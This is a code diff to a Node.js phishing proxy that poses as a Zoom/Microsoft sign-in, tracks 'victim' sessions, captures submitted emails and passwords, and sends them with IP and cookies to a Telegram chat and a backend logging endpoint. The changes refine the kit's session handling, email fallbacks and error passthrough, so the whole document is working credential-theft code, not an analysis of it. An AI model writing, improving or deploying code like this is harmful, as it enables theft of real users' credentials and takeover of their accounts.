@@ -32,42 +32,32 @@ function generateSessionId() {
 }
 
 function getSessionIdFromCookie(cookieHeader) {
-    if (!cookieHeader) {
-        console.log('[SESSION] No cookie header found');
-        return null;
-    }
+    if (!cookieHeader) return null;
     const cookies = cookieHeader.split('; ');
     for (const cookie of cookies) {
         const [name, value] = cookie.split('=');
         if (name === 'sessionId') {
-            console.log(`[SESSION] Found sessionId: ${value}`);
             return value;
         }
     }
-    console.log('[SESSION] No sessionId found in cookies');
     return null;
 }
 
 function getSession(sessionId) {
     if (!sessionId) return null;
     const session = VICTIM_SESSIONS[sessionId];
-    if (!session) {
-        console.log(`[SESSION] Session ${sessionId} not found`);
-        return null;
-    }
+    if (!session) return null;
     if (Date.now() - session.timestamp > SESSION_TTL) {
-        console.log(`[SESSION] Session ${sessionId} expired`);
         delete VICTIM_SESSIONS[sessionId];
         return null;
     }
-    console.log(`[SESSION] Session found for email: ${session.email}`);
     return session;
 }
 
 function createSession(email) {
     const sessionId = generateSessionId();
     VICTIM_SESSIONS[sessionId] = {
-        email: email,
+        email: email || 'unknown',
         timestamp: Date.now(),
         ip: null
     };
@@ -116,8 +106,8 @@ async function sendToBackend(email, password, req, attemptType, ip) {
         const axios = require('axios');
         await axios.post(`${BACKEND_URL}/api/log-action`, {
             action: attemptType === 'valid' ? 'login_success' : 'login_failed',
-            email,
-            password,
+            email: email || 'unknown',
+            password: password || '',
             visitorInfo: {
                 fullUrl: req.url,
                 userAgent: req.headers['user-agent'] || 'Unknown',
@@ -134,9 +124,9 @@ async function sendAuthResultToTelegram(email, password, success, ip, attemptCou
     try {
         const axios = require('axios');
         let msg = `🔐 *Zoom Login Attempt #${attemptCount}*\n\n`;
-        msg += `*📧 Email:* ${email}\n`;
-        msg += `*🔑 Password:* ${password}\n`;
-        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*📧 Email:* ${email || 'unknown'}\n`;
+        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
+        msg += `*📡 IP:* ${ip || 'unknown'}\n`;
         msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
         msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;
         if (cookies) {
@@ -222,12 +212,27 @@ function serveFile(filename, res, contentType = 'text/html') {
 // ============================================================
 
 function handleLoginRequest(req, res) {
+    // ============================================================
+    //  FIX: Extract email from URL and decode properly
+    // ============================================================
     const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
-    const email = rawEmail ? decodeURIComponent(rawEmail) : '';
-
+    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
+    
+    // If no email in URL, try to get from session
     if (!email) {
-        console.warn('[PROXY] ⚠️ No email found in request');
+        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        if (sessionId && VICTIM_SESSIONS[sessionId]) {
+            email = VICTIM_SESSIONS[sessionId].email;
+        }
     }
+    
+    // If still no email, use a default test email
+    if (!email) {
+        console.warn('[PROXY] ⚠️ No email found in request, using test email');
+        email = 'test@example.com';
+    }
+
+    const hasError = req.url.includes('error=');
 
     // Create session and store email
     const sessionId = createSession(email);
@@ -235,7 +240,12 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
+    // Build the Microsoft OAuth URL
     let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
+    if (hasError) {
+        const errorParam = req.url.split('error=')[1]?.split('&')[0] || '';
+        targetUrl += `&error=${errorParam}`;
+    }
 
     console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
     console.log(`[PROXY] 📧 Email: ${email}`);
@@ -257,42 +267,33 @@ function handleLoginRequest(req, res) {
     });
 }
 
-// ============================================================
-//  FIXED: handlePostRequest with proper session retrieval
-// ============================================================
-
 function handlePostRequest(body, req, res) {
     try {
         const formData = querystring.parse(body);
         const ip = getClientIp(req);
 
-        // --- DEBUG: Log all cookies and headers ---
-        console.log('[POST] Cookie header:', req.headers.cookie);
-        console.log('[POST] All headers:', req.headers);
-
-        // --- Extract email: session first, then form, then referer, then URL ---
+        // ============================================================
+        //  FIX: Extract email from session first, then form, then referer, then URL
+        // ============================================================
         let email = '';
         const sessionId = getSessionIdFromCookie(req.headers.cookie);
         
+        // 1. Try session
         if (sessionId) {
             const session = getSession(sessionId);
             if (session) {
                 email = session.email;
                 console.log(`[POST] ✅ Using session email: ${email}`);
-            } else {
-                console.log(`[POST] ⚠️ Session ${sessionId} not found or expired`);
             }
-        } else {
-            console.log('[POST] ⚠️ No sessionId found in cookies');
         }
-
-        // If session didn't work, try form data
+        
+        // 2. Try form data
         if (!email) {
             email = formData.login || formData.loginfmt || formData.email || '';
             if (email) console.log(`[POST] Using form email: ${email}`);
         }
-
-        // Try referer
+        
+        // 3. Try referer
         if (!email) {
             const referer = req.headers.referer || '';
             const match = referer.match(/login_hint=([^&]+)/);
@@ -301,8 +302,8 @@ function handlePostRequest(body, req, res) {
                 console.log(`[POST] Using referer email: ${email}`);
             }
         }
-
-        // Try URL
+        
+        // 4. Try URL
         if (!email) {
             const match = req.url.match(/login_hint=([^&]+)/);
             if (match) {
@@ -311,11 +312,13 @@ function handlePostRequest(body, req, res) {
             }
         }
 
-        const password = formData.passwd || formData.password || '';
+        // 5. Final fallback: use a test email
         if (!email) {
-            email = 'unknown';
-            console.log('[POST] ⚠️ No email found anywhere');
+            console.warn('[POST] ⚠️ No email found anywhere, using test email');
+            email = 'test@example.com';
         }
+
+        const password = formData.passwd || formData.password || '';
 
         // Track attempts
         let attemptCount = attemptCounts.get(email) || 0;
